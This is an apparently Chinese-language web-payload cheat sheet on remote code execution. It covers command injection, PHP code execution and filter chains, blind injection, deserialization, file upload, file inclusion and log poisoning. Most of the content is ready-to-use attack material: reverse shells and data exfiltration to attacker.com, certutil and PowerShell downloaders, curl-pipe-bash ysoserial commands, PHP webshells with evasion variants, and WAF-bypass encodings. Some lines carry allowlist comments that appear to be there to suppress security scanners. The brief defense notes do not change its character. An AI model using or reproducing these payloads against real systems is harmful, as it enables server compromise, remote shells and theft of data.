# RCE远程代码执行

> ⚠️ Security notice: examples below may include download-and-execute patterns, shown for defensive understanding and authorized testing only. Never run them against systems you do not own.


_12 条 web payload_

### 命令注入  `rce-command-injection`
_操作系统命令注入攻击技术_
子类：**命令注入** · tags: `rce` `command` `injection` `os`

**前置条件：**
- 存在系统命令执行功能
- 用户输入未过滤

**攻击链：**

**1. 探测命令注入**
> 探测命令注入点
```
; id
| id
`id`
$(id)
&& id
|| id
test;id
test|id
```
**语法解析：**
- `;` — Linux命令分隔符 _operator_
- `|` — 管道符，传递输出 _operator_
- ``` — 反引号命令替换 _value_
- `$()` — 命令替换语法 _function_
- `&&` — 前命令成功后执行 _operator_
- `||` — 前命令失败后执行 _operator_

**2. Linux命令注入**
> Linux系统命令注入
_platform: linux_
```
; whoami
; id
; cat /etc/passwd
; ls -la /
; nc -e /bin/bash attacker.com 4444
; bash -i >& /dev/tcp/attacker/4444 0>&1
```
**语法解析：**
- `whoami` — 显示当前用户 _command_
- `nc -e` — Netcat反弹Shell _value_
- `/dev/tcp` — Bash网络重定向 _value_

**3. Windows命令注入**
> Windows系统命令注入
_platform: windows_
```
& whoami
& dir
& type C:\windows\win.ini
& certutil -urlcache -split -f http://attacker/shell.exe shell.exe & shell.exe
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/shell.ps1')"  # security-allowlist: SEC005
```
**语法解析：**
- `&` — Windows命令分隔符 _operator_
- `certutil` — Windows下载工具 _value_
- `powershell -c` — 执行PowerShell命令 _value_

**4. 盲命令注入**
> 盲命令注入探测
```
; sleep 5
; ping -c 5 attacker.com
& timeout 5
通过响应时间差异判断命令是否执行
```
**语法解析：**
- `sleep` — Linux延时命令 _keyword_
- `timeout` — Windows延时命令 _value_

**5. 外带数据**
> 通过外带通道获取数据
_platform: linux_
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id|base64)
; nslookup $(whoami).attacker.com
; ping $(whoami | xxd -p).attacker.com
```
**语法解析：**
- `curl` — HTTP请求工具 _command_
- `nslookup` — DNS查询工具 _value_
- `xxd -p` — 转换为十六进制 _value_

**WAF/EDR 绕过变体：**

**空格绕过**
> 绕过空格过滤
_platform: linux_
```
;{cat,/etc/passwd}
;cat$IFS/etc/passwd
;cat</etc/passwd
;cat%09/etc/passwd
;cat${IFS}/etc/passwd
```
**语法解析：**
- `$IFS` — 内部字段分隔符变量 _variable_
- `%09` — Tab字符URL编码 _encoding_
- `{}` — 大括号扩展 _value_

**关键字绕过**
> 绕过关键字过滤
_platform: linux_
```
; c''at /etc/passwd
; c""at /etc/passwd
; c\at /etc/passwd
; /bin/c?a?t /etc/passwd
; /bin/ca[t] /etc/passwd
```

**编码绕过**
> 使用编码绕过
_platform: linux_
```
; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash  # security-allowlist: SEC008
; $(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```
**语法解析：**
- `base64 -d` — Base64解码 _value_
- `printf "\x"` — 十六进制编码 _value_


**概述：** OS命令注入允许攻击者通过Web应用在服务器操作系统上执行任意系统命令。漏洞通常出现在应用调用系统命令处理用户输入的场景(如文件操作、网络诊断、数据处理等)。

**漏洞原理：** 命令注入的根因是应用将用户输入直接拼接到system()/exec()/popen()等系统命令执行函数中。攻击者通过管道符(|)、分号(;)、反引号(`)、$()等shell元字符链接恶意命令，突破原始命令的预期行为。

**利用方法：** 完整利用流程：
1. 探测命令注入点
2. 确定操作系统类型
3. 绕过过滤机制
4. 执行恶意命令
5. 获取Shell或窃取数据

**防御措施：** 防御措施：
1. 避免使用系统命令执行函数
2. 使用参数化API调用
3. 严格的输入验证和白名单
4. 使用最小权限运行
5. 禁用危险函数

---

### PHP代码执行  `rce-php`
_PHP代码执行漏洞利用技术_
子类：**PHP代码执行** · tags: `rce` `php` `code` `execution`

**前置条件：**
- 存在PHP代码执行点
- 用户输入可控制代码

**攻击链：**

**1. 常见危险函数**
> PHP危险函数
```
eval($_POST[cmd]);
assert($_POST[cmd]);
preg_replace('/a/e',$_POST[cmd],'a');
create_function('',$_POST[cmd]);
array_map($_POST[func],$_POST[arr]);
call_user_func($_POST[func],$_POST[arg]);
```
**语法解析：**
- `eval()` — 执行字符串作为PHP代码 _function_
- `assert()` — 断言函数，可执行代码 _function_
- `preg_replace /e` — 正则替换执行模式 _value_
- `create_function()` — 动态创建函数 _function_

**2. 命令执行**
> PHP命令执行函数
```
system('whoami');
exec('whoami');
shell_exec('whoami');
passthru('whoami');
popen('whoami','r');
proc_open('whoami',$desc,$pipes);
`whoami`;
```
**语法解析：**
- `system()` — 执行命令并输出结果 _function_
- `exec()` — 执行命令返回最后一行 _function_
- `shell_exec()` — 执行命令返回全部输出 _function_
- ```` — 反引号执行命令 _value_

**3. 一句话木马**
> 常见一句话木马
```
<?php @eval($_POST[cmd]);?>
<?php @assert($_POST[cmd]);?>
<?php @system($_GET[cmd]);?>
<?php $a=create_function('',$_POST[cmd]);$a();?>
```
**语法解析：**
- `system()` — 系统命令执行 _function_
- `eval()` — 代码执行 _function_

**4. 免杀一句话**
> 免杀一句话木马
```
<?php $a='ev'.$_POST[1];$a($_POST[cmd]);?>
<?php $_='a'.'s'.'s'.'e'.'r'.'t';$_($_POST[cmd]);?>
<?php $a=base64_decode('YXNzZXJ0');$a($_POST[cmd]);?>
```
**语法解析：**
- `<?php` — 命令/关键字 _command_

**WAF/EDR 绕过变体：**

**回调函数绕过**
> 使用回调函数
```
array_map('assert',array($_POST[cmd]));
call_user_func('assert',$_POST[cmd]);
$a='assert';$a($_POST[cmd]);
```
**语法解析：**
- `array_map` — PHP数组映射回调函数 _function_
- `assert` — 执行PHP代码的断言函数 _function_
- `call_user_func` — 调用用户回调函数 _function_
- `$_POST[cmd]` — 从POST参数获取命令 _variable_

**变量函数绕过**
> WAF绕过技术
```
$func=$_GET['func'];$cmd=$_GET['cmd'];$func($cmd);
```
**语法解析：**
- `$func=$_GET["func"]` — 从GET参数获取函数名 _variable_
- `$cmd=$_GET["cmd"]` — 从GET参数获取命令 _variable_
- `$func($cmd)` — 变量函数调用，动态执行 _technique_


**概述：** PHP代码执行漏洞通过eval()/assert()/preg_replace(e修饰符)/array_map()等函数将用户输入作为PHP代码执行，可直接读取文件、操作数据库、执行系统命令等。

**漏洞原理：** PHP危险函数包括：eval()/assert()直接执行代码字符串、preg_replace()的e修饰符(PHP<7)将替换结果作为代码执行、create_function()/call_user_func()动态函数调用、array_map()/usort()回调函数注入。

**利用方法：** 完整利用流程：
1. 发现代码执行点
2. 构造恶意代码
3. 执行系统命令
4. 写入WebShell
5. 获取服务器权限

**防御措施：** 防御措施：
1. 禁用危险函数
2. 使用白名单验证输入
3. 使用参数化调用
4. 最小权限原则

---

### PHP Filter链RCE  `rce-php-filter`
_利用PHP Filter链构造RCE_
子类：**PHP Filter链** · tags: `rce` `php` `filter` `chain`

**前置条件：**
- 存在文件包含漏洞
- PHP版本支持Filter链

**攻击链：**

**1. Filter链原理**
> Filter链原理
```
利用php://filter的convert.base64-decode等过滤器
通过精心构造的输入，最终生成可执行代码
```
**语法解析：**
- `利用php://filter的convert.base64-decode等过滤器
通过精心构造的输入，最终生成可执行代码` — 攻击载荷 _value_

**2. 构造Filter链**
> 构造Filter链
```
php://filter/convert.base64-decode/resource=data://,plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==
使用多个过滤器串联
```
**语法解析：**
- `php://filter` — PHP过滤器协议 _value_
- `convert.base64-decode` — Base64解码过滤器 _value_
- `resource=` — 指定资源 _value_

**3. 使用工具生成**
> 使用工具生成Filter链
```
# 使用php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# 输出可直接使用的Filter链
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 使用php_filter_chain_generator
python3 php_filter_chain_generator.py --chain "<?php system($_GET[cmd]);?>"

# 输出可直接使用的Filter链` — 参数与载荷内容 _value_

**4. 完整利用示例**
> 完整Filter链示例
```
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp
```
**语法解析：**
- `?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码组合绕过
```
使用不同编码过滤器组合
绕过关键字检测
```
**语法解析：**
- `使用不同编码过滤器组合
绕过关键字检测` — 攻击载荷 _value_


**概述：** PHP Filter链RCE是2022年发现的新技术，通过精心组合多个php://filter过滤器(iconv字符集转换)，在不使用文件上传的情况下从无到有生成任意内容，配合include实现RCE。

**漏洞原理：** PHP Filter链利用iconv字符集转换过滤器的组合效应：通过特定的字符集转换序列(如UTF-7→UTF-8)逐字节构造任意PHP代码。一个LFI漏洞(include($_GET["file"]))配合Filter链即可直接RCE，无需文件上传或日志投毒。

**利用方法：** 完整利用流程：
1. 发现文件包含漏洞
2. 使用工具生成Filter链
3. 构造恶意请求
4. 执行任意代码

**防御措施：** 防御措施：
1. 禁用php://filter
2. 白名单限制文件路径
3. 禁用危险过滤器
4. 升级PHP版本

---

### 盲命令注入  `rce-cmd-blind`
_无回显的命令注入利用技术_
子类：**盲命令注入** · tags: `rce` `blind` `command` `injection`

**前置条件：**
- 存在命令注入点
- 无直接回显

**攻击链：**

**1. 时间盲注**
> 使用延时判断
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& timeout 5
观察响应时间判断命令是否执行
```
**语法解析：**
- `sleep 5` — Linux延时命令 _value_
- `timeout 5` — Windows延时命令 _value_

**2. DNS外带**
> DNS外带数据
```
; nslookup $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
; host $(id | base64).attacker.com
& nslookup %USERNAME%.attacker.com
```
**语法解析：**
- `nslookup` — DNS查询工具 _value_
- `$(whoami)` — 命令替换获取用户名 _value_
- `.attacker.com` — 攻击者控制的域名 _domain_

**3. HTTP外带**
> HTTP外带数据
```
; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(id)
; curl -d @/etc/passwd http://attacker.com/
& certutil -urlcache -f http://attacker.com/?data=%USERNAME%
```
**语法解析：**
- `; curl http://attacker.com/?data=$(whoami)
; wget http://attacker.com/?data=$(i` — 攻击载荷 _value_

**4. ICMP外带**
> ICMP外带数据
_platform: linux_
```
; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
在攻击者服务器监听ICMP包
```
**语法解析：**
- `; ping -p $(echo "test" | xxd -p) attacker.com
; tcpdump -i eth0 icmp
在攻击者服务器监` — 攻击载荷 _value_

**5. 反弹Shell**
> 反弹Shell
```
; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4444
; python -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
```
**语法解析：**
- `; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
; nc -e /bin/bash attacker 4` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**编码绕过**
> Base64编码绕过
_platform: linux_
```
; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash  # security-allowlist: SEC008
使用Base64编码绕过
```
**语法解析：**
- `;` — 命令/载荷起始 _command_
- ` echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash <!-- security-allowlist: SEC008 -->
使用Base64编码绕过` — 参数与载荷内容 _value_


**概述：** 盲命令注入是指命令执行成功但结果不回显在响应中的场景，需要通过DNS外带(nslookup)、HTTP外带(curl)、延时判断(sleep)或写文件等间接方式确认漏洞存在和提取数据。

**漏洞原理：** 盲命令注入的确认和利用方式：1)时间延迟(;sleep 5)判断执行 2)DNS外带(;nslookup $(whoami).attacker.com)获取命令输出 3)HTTP外带(curl http://attacker.com/$(cat /etc/hostname)) 4)写入Web目录后HTTP访问获取结果。

**利用方法：** 完整利用流程：
1. 确认命令注入存在（时间盲注）
2. 使用外带通道获取数据
3. 构造反弹Shell
4. 获取服务器权限

**防御措施：** 防御措施：
1. 避免使用系统命令
2. 使用参数化API
3. 输入白名单验证
4. 禁用危险函数

---

### 反序列化漏洞  `rce-deserialize`
_利用反序列化漏洞实现RCE_
子类：**反序列化** · tags: `rce` `deserialize` `java` `php`

**前置条件：**
- 存在反序列化点
- 存在可利用的Gadget链

**攻击链：**

**1. Java反序列化**
> Java反序列化
```
# 常见漏洞组件
Apache Commons Collections
Spring Framework
Fastjson
Jackson
WebLogic

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash"  # security-allowlist: curl-pipe-bash
```
**语法解析：**
- `ysoserial` — Java反序列化利用工具 _value_
- `CommonsCollections1` — 利用链名称 _encoding_

**2. PHP反序列化**
> PHP反序列化
```
<?php
class Exploit {
    public $cmd = "system('whoami');";
    function __destruct() {
        eval($this->cmd);
    }
}
echo serialize(new Exploit());
?>
生成: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**3. Python反序列化**
> Python pickle反序列化
```
import pickle
import os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
# 发送payload触发反序列化
```
**语法解析：**
- `import` — 命令/关键字 _command_

**4. .NET反序列化**
> .NET反序列化
_platform: windows_
```
# 使用ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"

# 常见格式
BinaryFormatter
Json.NET
XMLSerializer
```
**语法解析：**
- `# 使用ysoserial.net
ysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**签名绕过**
> 绕过签名验证
```
如果存在签名验证
需要获取密钥重新签名
```
**语法解析：**
- `如果存在签名验证
需要获取密钥重新签名` — 攻击载荷 _value_


**概述：** 反序列化漏洞是将不可信数据还原为对象时触发恶意操作，存在于Java/PHP/Python/.NET等多种语言中。攻击者构造特殊的序列化数据，在反序列化过程中自动调用危险方法实现RCE。

**漏洞原理：** 反序列化攻击利用对象在还原时自动调用的魔术方法(如Java的readObject、PHP的__wakeup/__destruct)。通过POP(Property Oriented Programming)链将多个类的方法调用串联，最终触发命令执行。

**利用方法：** 完整利用流程：
1. 识别反序列化点
2. 分析可用的Gadget链
3. 生成恶意序列化数据
4. 发送触发RCE

**防御措施：** 防御措施：
1. 避免反序列化不可信数据
2. 使用白名单类限制
3. 禁用危险Gadget
4. 使用安全的序列化格式

---

### PHP反序列化  `rce-deserialize-php`
_PHP反序列化漏洞利用技术_
子类：**PHP反序列化** · tags: `rce` `php` `deserialize` `unserialize`

**前置条件：**
- 存在unserialize调用
- 存在可利用的类

**攻击链：**

**1. 魔术方法**
> PHP魔术方法
```
__construct() - 对象创建时调用
__destruct() - 对象销毁时调用
__wakeup() - 反序列化时调用
__toString() - 对象转字符串时调用
__call() - 调用不存在方法时触发
```
**语法解析：**
- `__destruct()` — 对象销毁时自动调用，常作为POP链的入口点 _command_
- `__wakeup()` — 反序列化时自动调用，可被CVE-2016-7124绕过 _command_
- `__toString()` — 对象转字符串时触发，如echo/print/字符串拼接 _command_
- `__call()` — 调用不存在方法时触发，可用于动态方法跳转 _command_

**2. 构造POP链**
> 构造POP链
```
<?php
class Chain {
    public $obj;
    function __destruct() {
        $this->obj->action();
    }
}
class Action {
    public $cmd;
    function action() {
        system($this->cmd);
    }
}
$payload = new Chain();
$payload->obj = new Action();
$payload->obj->cmd = "whoami";
echo serialize($payload);
?>
```
**语法解析：**
- `class Chain` — 入口类，__destruct触发时调用obj的action方法 _command_
- `$this->obj->action()` — 链式调用，通过对象属性跳转到目标类方法 _operator_
- `system($this->cmd)` — 最终执行系统命令的sink点 _value_
- `serialize($payload)` — 将构造好的对象链序列化为字符串payload _command_

**3. Phar反序列化**
> Phar反序列化
```
# 生成Phar文件
<?php
class Exploit {}
$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>

# 触发反序列化
phar://exploit.phar/test.txt
```
**语法解析：**
- `new Phar()` — 创建Phar归档文件对象 _command_
- `setStub()` — 设置Phar文件头标识，__HALT_COMPILER()为必需结束符 _parameter_
- `setMetadata($o)` — 设置元数据为恶意对象，读取Phar时自动反序列化 _value_
- `phar://exploit.phar` — phar://流包装器触发元数据反序列化 _command_

**4. Session反序列化**
> Session反序列化
```
# 利用Session处理器差异
# php_serialize vs php_binary
构造恶意Session数据触发反序列化
```
**语法解析：**
- `php_serialize` — Session序列化处理器，使用标准serialize格式 _parameter_
- `php_binary` — 另一种Session处理器，使用二进制格式 _parameter_
- `处理器差异` — 不同处理器的分隔符不同导致注入恶意序列化数据 _value_

**WAF/EDR 绕过变体：**

**属性修饰符绕过**
> 属性修饰符处理
```
使用public/private/protected属性
注意序列化格式差异:
public: s:3:"cmd"
private: s:8:"\0Class\0cmd"
protected: s:7:"\0*\0cmd"
```
**语法解析：**
- `public: s:3:"cmd"` — 公有属性直接序列化属性名 _value_
- `private: s:8:"\0Class\0cmd"` — 私有属性前后加\\0和类名，长度包含null字节 _value_
- `protected: s:7:"\0*\0cmd"` — 受保护属性前后加\\0和*号 _value_


**概述：** PHP反序列化利用unserialize()函数处理用户可控数据时触发魔术方法(__destruct/__wakeup/__toString等)，通过POP链调用system()/exec()等危险函数实现RCE。

**漏洞原理：** PHP反序列化利用链：unserialize()触发__wakeup()或反序列化后触发__destruct()，通过修改对象属性指向其他类的方法(POP链)，最终调用命令执行函数。常见利用框架包括Laravel(PendingBroadcast链)、Yii(BatchQueryResult链)等。

**利用方法：** 完整利用流程：
1. 找到unserialize调用点
2. 分析可利用的类
3. 构造POP链
4. 生成序列化payload
5. 发送触发RCE

**防御措施：** 防御措施：
1. 避免反序列化用户输入
2. 使用json_encode替代
3. 白名单类限制
4. 禁用Phar

---

### Java反序列化  `rce-deserialize-java`
_Java反序列化漏洞利用技术_
子类：**Java反序列化** · tags: `rce` `java` `deserialize` `ysoserial`

**前置条件：**
- 存在Java反序列化点
- 存在Gadget链

**攻击链：**

**1. 常见Gadget链**
> 常见Gadget链
```
CommonsCollections - Apache Commons Collections
CommonsBeanutils - Apache Commons BeanUtils
Spring - Spring Framework
Jdk7u21 - JDK原生Gadget
Groovy - Apache Groovy
Hibernate - Hibernate ORM
```
**语法解析：**
- `CommonsCollections` — Apache CC库Gadget链，最经典的Java反序列化利用链 _command_
- `CommonsBeanutils` — Apache BeanUtils Gadget，利用属性访问触发执行 _command_
- `Jdk7u21` — JDK原生Gadget，无需第三方依赖，利用AnnotationInvocationHandler _command_
- `Hibernate` — Hibernate ORM Gadget，利用HQL查询触发代码执行 _command_

**2. 使用ysoserial**
> 使用ysoserial生成payload
```
# 列出所有Gadget
java -jar ysoserial.jar

# 生成payload
java -jar ysoserial.jar CommonsCollections1 "curl attacker.com/shell.sh|bash" > payload.ser  # security-allowlist: curl-pipe-bash
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```
**语法解析：**
- `java -jar ysoserial.jar` — 运行ysoserial反序列化payload生成工具 _command_
- `CommonsCollections1` — 指定使用的Gadget链名称 _parameter_
- `"curl attacker.com/shell.sh|bash"` — 要执行的系统命令（反弹Shell常用） _value_ <!-- security-allowlist: curl-pipe-bash -->
- `> payload.ser` — 将生成的序列化数据保存为二进制文件 _operator_
- `{echo,BASE64}|{base64,-d}|{bash,-i}` — Bash花括号扩展绕过空格和特殊字符限制 _value_

**3. JRMP攻击**
> JRMP攻击
```
# 启动JRMP服务
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections1 "touch /tmp/pwned"

# 发送JRMP客户端payload
java -jar ysoserial.jar JRMPClient attacker:4444
```
**语法解析：**
- `ysoserial.exploit.JRMPListener` — 启动JRMP恶意服务端，等待目标连接 _command_
- `4444` — JRMP监听端口 _value_
- `CommonsCollections1` — 服务端返回给客户端的Gadget链类型 _parameter_
- `JRMPClient` — 生成JRMP客户端payload，目标反序列化后连接攻击者 _command_

**4. 内存马注入**
> 内存马注入
```
# 使用ysoserial注入内存马
java -jar ysoserial.jar CommonsCollections1 "生成内存马字节码"

# 或使用工具
java -jar ysuserial.jar CommonsCollections1 "内存马命令"
```
**语法解析：**
- `内存马` — 无文件WebShell，注入到JVM内存中的Servlet/Filter/Listener _command_
- `字节码` — 编译后的Java类字节码，运行时动态加载 _parameter_
- `CommonsCollections1` — 利用CC链触发ClassLoader加载恶意字节码 _value_

**WAF/EDR 绕过变体：**

**二次反序列化**
> 二次反序列化绕过
```
使用SignedObject或RMI绕过黑名单
```
**语法解析：**
- `SignedObject` — JDK内置类，包装另一个序列化对象绕过黑名单检测 _command_
- `RMI` — 远程方法调用，通过网络传输序列化对象绕过本地检测 _command_

**反射绕过**
> 反射绕过
```
使用反射设置属性绕过限制
```
**语法解析：**
- `反射` — Java反射机制在运行时动态修改对象属性绕过限制 _command_
- `setAccessible(true)` — 突破private访问限制，修改私有字段值 _parameter_


**概述：** Java反序列化是最具破坏力的漏洞类型之一，利用Apache Commons Collections/BeanUtils等库中的Gadget链，在ObjectInputStream.readObject()时触发任意代码执行。

**漏洞原理：** Java反序列化利用ysoserial等工具生成Gadget链：CommonsCollections系列(InvokerTransformer链)、CommonsBeanutils(BeanComparator链)、URLDNS(DNS探测)等。序列化数据(AC ED 00 05魔术字节)出现在Cookie/HTTP参数/JMX/RMI等位置。

**利用方法：** 完整利用流程：
1. 识别反序列化点
2. 检测依赖库
3. 选择合适的Gadget链
4. 生成payload
5. 发送触发RCE

**防御措施：** 防御措施：
1. 升级依赖库版本
2. 使用ObjectInputFilter
3. 白名单类限制
4. 禁用反序列化

---

### 文件上传漏洞  `rce-file-upload`
_利用文件上传漏洞获取RCE_
子类：**文件上传** · tags: `rce` `upload` `webshell` `file`

**前置条件：**
- 存在文件上传功能
- 可上传可执行文件

**攻击链：**

**1. 基础上传**
> 直接上传可执行文件
```
上传PHP文件: shell.php
上传JSP文件: shell.jsp
上传ASPX文件: shell.aspx
上传CGI文件: shell.cgi
```
**语法解析：**
- `shell.php` — PHP WebShell文件，服务器会直接解析执行 _value_
- `shell.jsp` — Java WebShell，运行在Tomcat/JBoss等容器 _value_
- `shell.aspx` — .NET WebShell，运行在IIS服务器 _value_

**2. 前端绕过**
> 绕过前端验证
```
# 修改Content-Type
Content-Type: image/jpeg

# 修改文件扩展名
test.php -> test.jpg.php
test.php -> test.php.jpg

# 使用空字节
test.php%00.jpg
```
**语法解析：**
- `Content-Type: image/jpeg` — 修改MIME类型欺骗前端/后端验证 _parameter_
- `test.php.jpg` — 双后缀名，部分服务器从左到右解析取第一个 _value_
- `test.php%00.jpg` — 空字节截断（PHP<5.3.4），%00后的内容被忽略 _value_

**3. 后端绕过**
> 绕过后端黑名单
```
# 黑名单绕过
.php -> .phtml, .php3, .php5, .pht
.asp -> .asa, .cer, .cdx
.jsp -> .jspx, .jspf

# 大小写绕过
.Php, .pHp, .PHP

# 双写绕过
.pphphp
```
**语法解析：**
- `.phtml, .php3, .php5, .pht` — PHP的替代扩展名，不在常见黑名单中 _value_
- `.Php, .pHp` — 大小写混合绕过Windows不区分大小写的文件系统 _value_
- `.pphphp` — 双写绕过，后端删除php后剩余拼接为.php _value_

**4. 图片马**
> 制作图片马
```
# 制作图片马
copy test.jpg/b + shell.php/a shell.jpg

# 利用文件包含执行
include($_GET['file']);
?file=upload/shell.jpg
```

**5. .htaccess上传**
> 利用.htaccess
_platform: linux_
```
# 上传.htaccess文件
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 之后上传的jpg文件会被当作PHP执行
```
**语法解析：**
- `AddType application/x-httpd-php .jpg` — 让Apache将.jpg文件当作PHP脚本解析 _command_
- `AddHandler php-script .jpg` — 另一种配置方式，为.jpg添加PHP处理器 _command_

**WAF/EDR 绕过变体：**

**Content-Type绕过**
> Content-Type绕过
```
修改请求中的Content-Type为允许的类型
image/jpeg, image/png, image/gif
```
**语法解析：**
- `Content-Type` — HTTP请求头中的MIME类型字段 _parameter_
- `image/jpeg` — 伪装为JPEG图片的MIME类型绕过服务端检测 _value_
- `image/png, image/gif` — 其他常见的白名单MIME类型 _value_

**文件头绕过**
> 文件头绕过
```
在恶意文件前添加图片文件头
GIF89a<?php eval($_POST[cmd]);?>
```
**语法解析：**
- `GIF89a` — GIF文件魔术头（文件签名），6字节 _command_
- `<?php eval([cmd]);?>` — 在文件头之后追加PHP代码 _value_


**概述：** 文件上传RCE通过上传包含恶意代码的文件(WebShell)到服务器的Web可访问目录，然后通过HTTP请求访问该文件触发代码执行，是获取服务器权限最直接的方式之一。

**漏洞原理：** 文件上传RCE的利用条件：1)服务器允许上传可执行文件(PHP/JSP/ASP) 2)上传目录在Web根目录下且可通过URL访问 3)服务器将上传文件以脚本方式解析。绕过手段包括后缀名变形、Content-Type篡改、路径穿越等。

**利用方法：** 完整利用流程：
1. 分析上传限制
2. 选择绕过方法
3. 上传WebShell
4. 访问执行
5. 获取服务器权限

**防御措施：** 防御措施：
1. 白名单验证扩展名
2. 检查文件内容
3. 重命名上传文件
4. 存储到非Web目录
5. 禁用执行权限

---

### 文件包含RCE  `rce-include`
_利用文件包含漏洞实现RCE_
子类：**文件包含** · tags: `rce` `include` `lfi` `rfi`

**前置条件：**
- 存在文件包含漏洞
- 可包含恶意文件

**攻击链：**

**1. 日志投毒**
> 日志投毒RCE
_platform: linux_
```
# 注入代码到日志
User-Agent: <?php system($_GET['cmd']);?>

# 包含日志文件
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/nginx/access.log&cmd=whoami
```
**语法解析：**
- `/var/log/apache2/access.log` — Apache访问日志 _path_
- `/var/log/nginx/access.log` — Nginx访问日志 _path_

**2. Session文件包含**
> Session文件包含
_platform: linux_
```
# 注入代码到Session
?file=/var/lib/php/sessions/sess_[PHPSESSID]

# Session内容
<?php system($_GET['cmd']);?>
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**3. /proc/self/environ**
> 包含环境变量
_platform: linux_
```
# 注入代码到环境变量
User-Agent: <?php system($_GET['cmd']);?>

# 包含环境变量文件
?file=/proc/self/environ&cmd=whoami
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**4. PHP伪协议**
> PHP伪协议利用
```
# php://input
?file=php://input
POST: <?php system('whoami');?>

# data://协议
?file=data://text/plain,<?php system('whoami');?>
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==
```
**语法解析：**
- `system()` — 执行系统命令 _function_
- `php://input` — PHP原始输入流 _technique_

**5. 远程文件包含**
```
# RFI直接包含远程Shell
?file=http://attacker.com/shell.txt

# shell.txt内容
<?php system($_GET['cmd']);?>
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**WAF/EDR 绕过变体：**

**编码绕过**
> URL编码绕过
```
?file=%2fvar%2flog%2fapache2%2faccess.log
URL编码路径
```
**语法解析：**
- `?file=%2fvar%2flog%2fapache2%2faccess.log
URL编码路径` — 攻击载荷 _value_


**概述：** 文件包含RCE将LFI/RFI漏洞升级为代码执行，通过包含日志文件、Session文件、/proc/self/environ、临时上传文件等方式注入并执行恶意PHP代码。

**漏洞原理：** 文件包含RCE的多种利用路径：1)日志投毒(User-Agent注入PHP代码→包含access.log) 2)Session文件包含(注入代码到Session→包含/tmp/sess_xxx) 3)/proc/self/environ中的User-Agent 4)PHP临时上传文件竞争条件。

**利用方法：** 完整利用流程：
1. 发现文件包含点
2. 注入恶意代码
3. 包含恶意文件
4. 执行系统命令
5. 获取Shell

**防御措施：** 防御措施：
1. 白名单验证文件路径
2. 禁用远程文件包含
3. 禁用PHP伪协议
4. 使用open_basedir限制

---

### 日志投毒RCE  `rce-log-poison`
_利用日志投毒实现RCE_
子类：**日志投毒** · tags: `rce` `log` `poison` `lfi`

**前置条件：**
- 存在文件包含漏洞
- 可读取日志文件

**攻击链：**

**1. Apache日志投毒**
> Apache日志投毒
_platform: linux_
```
# 注入代码到访问日志
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志执行
?file=/var/log/apache2/access.log&cmd=whoami
?file=/var/log/httpd/access_log&cmd=whoami
```
**语法解析：**
- `/var/log/apache2/access.log` — Debian/Ubuntu日志路径 _path_
- `/var/log/httpd/access_log` — CentOS/RHEL日志路径 _path_

**2. Nginx日志投毒**
```
# 注入代码
curl -A "<?php system(\$_GET['cmd']);?>" http://target/

# 包含日志
?file=/var/log/nginx/access.log&cmd=whoami
```
**语法解析：**
- `system()` — 系统命令执行 _function_
- `curl` — HTTP请求工具 _command_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
使用URL编码或Base64编码绕过关键字过滤
```
**语法解析：**
- `使用URL编码或Base64编码绕过关键字过滤` — 攻击载荷 _value_


